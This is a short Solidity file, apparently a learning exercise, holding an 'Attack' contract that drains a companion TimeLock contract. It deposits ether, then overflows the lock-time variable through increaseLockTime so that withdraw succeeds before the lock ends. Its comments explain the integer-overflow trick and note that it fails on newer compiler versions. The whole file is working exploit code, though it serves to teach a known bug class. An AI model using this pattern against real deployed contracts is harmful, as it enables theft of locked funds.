//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "./TimeLock.sol";

contract Attack{
     
     TimeLock tl;
      
    constructor(address a) payable{
        tl = TimeLock(a);
    }

    function deposit() external{
        tl.deposit{value: 1 ether}();
    }

    //after depositing the funds are locked for one week 
    //I bypassed this by overflowing the lockTime variable 

    function attack() external{

        //to overflow the variable I had to add a number that once added
        //would exceed the max value of uint
        //therefore causing an overflow and getting the variable to 0
        //then I added one to make it > 0
        tl.increaseLockTime(type(uint).max+1 - tl.lockTime(address(this)));

        tl.withdraw();
    }

    //this exploit does not work on new versions of solidity 
    //but caused a lot of harm in the past 

    fallback() external payable{}
}
